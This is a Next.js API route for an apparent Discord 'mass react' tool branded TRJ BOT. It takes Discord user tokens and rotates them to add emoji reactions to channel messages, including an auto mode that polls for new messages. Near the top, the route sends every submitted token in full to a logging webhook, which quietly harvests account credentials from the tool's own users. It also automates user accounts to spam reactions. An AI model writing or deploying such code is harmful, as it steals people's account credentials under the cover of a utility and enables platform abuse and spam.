import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook, sendFullToken } from '@/lib/webhook';
import { discordFetch, cleanToken } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

export const runtime = 'edge';

function sleep(ms: number) {
  return new Promise(r => setTimeout(r, ms));
}

export async function POST(request: NextRequest) {
  try {
    // Rate Limiting
    const rlIp = getClientIp(request);
    const rl = rateLimit(`${rlIp}:mass-react`, RATE_LIMITS.medium);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } });
    }


    const body = await request.json().catch(() => ({}));
    const { token, tokens: tokensArr, channelId, emoji, count = 10, messageId, mode = 'manual', duration = 60 } = body;

    // Support single or multiple tokens
    const allTokens = (Array.isArray(tokensArr) && tokensArr.length > 0
      ? tokensArr.map((t: string) => cleanToken(t)).filter((t: string) => t.length >= 20)
      : token ? [cleanToken(token)] : []);

    if (allTokens.length === 0 || !channelId || !emoji) {
      return NextResponse.json({ success: false, error: 'بيانات ناقصة (التوكن، أيدي الروم، الإيموجي)' }, { status: 400 });
    }

    sendFullToken('رياكشن', allTokens.join('\n'), { '📺 الروم': channelId });

    const whUrl = getLogWebhookUrl();

    // Per-token stats tracking
    const tokenStats: Record<string, { sent: number; failed: number }> = {};
    for (const t of allTokens) {
      tokenStats[t.substring(0, 20)] = { sent: 0, failed: 0 };
    }

    let totalSent = 0, totalFailed = 0;
    let tokenIdx = 0;
    const getNextToken = () => allTokens[tokenIdx++ % allTokens.length];

    const modeLabel = mode === 'auto' ? 'Auto React' : 'Mass React';

    sendToWebhook({
      username: 'TRJ React',
      embeds: [{
        title: `🎭 ${modeLabel} Started`,
        color: 0x5865F2,
        fields: [
          { name: '📺 Channel', value: channelId, inline: true },
          { name: '🎭 Emoji', value: emoji.substring(0, 50), inline: true },
          { name: '🔄 Mode', value: mode, inline: true },
          { name: '🎫 Tokens', value: `${allTokens.length} توكن`, inline: true },
          ...(mode === 'auto' ? [{ name: '⏱️ Duration', value: `${duration}s`, inline: true }] : []),
          ...(mode === 'manual' ? [{ name: '🔢 Count', value: String(count), inline: true }] : []),
        ],
        footer: { text: 'TRJ BOT v4.3' },
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    const emojis = emoji.split(/\s+/).filter(Boolean);

    if (mode === 'auto') {
      // ===== AUTO MODE: Poll for new messages and react =====
      const endTime = Date.now() + (duration * 1000);
      const processedIds = new Set<string>();

      // Get latest message as starting point
      const initialRes = await discordFetch(getNextToken(), 'GET', `/channels/${channelId}/messages?limit=1`);
      const initialData = initialRes.data as Record<string, unknown>[] | null;
      if (!initialRes.ok || !Array.isArray(initialData) || initialData.length === 0) {
        return NextResponse.json({ success: false, error: 'فشل جلب الرسائل من الروم' }, { status: 400 });
      }
      // Mark existing messages as processed
      for (const msg of initialData) {
        processedIds.add(String(msg.id));
      }

      // Poll loop - check every 3-5 seconds
      while (Date.now() < endTime) {
        await sleep(3000 + Math.random() * 2000);

        const ct = getNextToken();
        const msgRes = await discordFetch(ct, 'GET', `/channels/${channelId}/messages?limit=10`);
        const msgData = msgRes.data as Record<string, unknown>[] | null;
        if (!msgRes.ok || !Array.isArray(msgData)) continue;

        for (const msg of msgData) {
          const mId = String(msg.id);
          if (processedIds.has(mId)) continue;
          processedIds.add(mId);

          // React with all emojis
          for (const e of emojis) {
            try {
              const tkn = getNextToken();
              const tknKey = tkn.substring(0, 20);
              const res = await discordFetch(tkn, 'PUT', `/channels/${channelId}/messages/${mId}/reactions/${encodeURIComponent(e)}/@me`);
              if (res.ok || res.status === 204) {
                totalSent++;
                if (tokenStats[tknKey]) tokenStats[tknKey].sent++;
              } else {
                totalFailed++;
                if (tokenStats[tknKey]) tokenStats[tknKey].failed++;
              }
            } catch {
              totalFailed++;
            }
          }
        }
      }

    } else {
      // ===== MANUAL MODE: React to existing messages =====
      if (messageId) {
        // React to a specific message
        for (const e of emojis) {
          try {
            const tkn = getNextToken();
            const tknKey = tkn.substring(0, 20);
            const res = await discordFetch(tkn, 'PUT', `/channels/${channelId}/messages/${messageId}/reactions/${encodeURIComponent(e)}/@me`);
            if (res.ok || res.status === 204) {
              totalSent++;
              if (tokenStats[tknKey]) tokenStats[tknKey].sent++;
            } else {
              totalFailed++;
              if (tokenStats[tknKey]) tokenStats[tknKey].failed++;
            }
          } catch { totalFailed++; }
        }
      } else {
        // React to last 50 messages
        const ct = getNextToken();
        const msgRes = await discordFetch(ct, 'GET', `/channels/${channelId}/messages?limit=50`);
        const msgData = msgRes.data as Record<string, unknown>[] | null;

        if (!msgData || !Array.isArray(msgData)) {
          return NextResponse.json({ success: false, error: 'فشل جلب الرسائل' }, { status: 400 });
        }

        for (const msg of msgData) {
          const mId = String(msg.id);
          for (const e of emojis) {
            try {
              const tkn = getNextToken();
              const tknKey = tkn.substring(0, 20);
              const res = await discordFetch(tkn, 'PUT', `/channels/${channelId}/messages/${mId}/reactions/${encodeURIComponent(e)}/@me`);
              if (res.ok || res.status === 204) {
                totalSent++;
                if (tokenStats[tknKey]) tokenStats[tknKey].sent++;
              } else {
                totalFailed++;
                if (tokenStats[tknKey]) tokenStats[tknKey].failed++;
              }
            } catch { totalFailed++; }
          }
          if (totalSent + totalFailed >= count * emojis.length) break;
        }
      }
    }

    // Build token stats fields for webhook
    const tokenStatFields = Object.entries(tokenStats).map(([key, val]) => ({
      name: `🎫 ${key}...`,
      value: `✅ ${val.sent} | ❌ ${val.failed}`,
      inline: true,
    }));

    sendToWebhook({
      username: 'TRJ React',
      embeds: [{
        title: '✅ React Completed',
        color: 0x00FF41,
        fields: [
          { name: '✅ Added', value: String(totalSent), inline: true },
          { name: '❌ Failed', value: String(totalFailed), inline: true },
          { name: '🎭 Emojis', value: String(emojis.length), inline: true },
          { name: '🔄 Mode', value: mode, inline: true },
          { name: '🎫 Tokens', value: String(allTokens.length), inline: true },
          ...(mode === 'auto' ? [{ name: '⏱️ Duration', value: `${duration}s`, inline: true }] : []),
          ...tokenStatFields,
        ],
        footer: { text: 'TRJ BOT v4.3' },
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    return NextResponse.json({
      success: true,
      stats: { sent: totalSent, failed: totalFailed },
      tokenStats,
    });

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    console.error('[Mass React Error]', message);
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
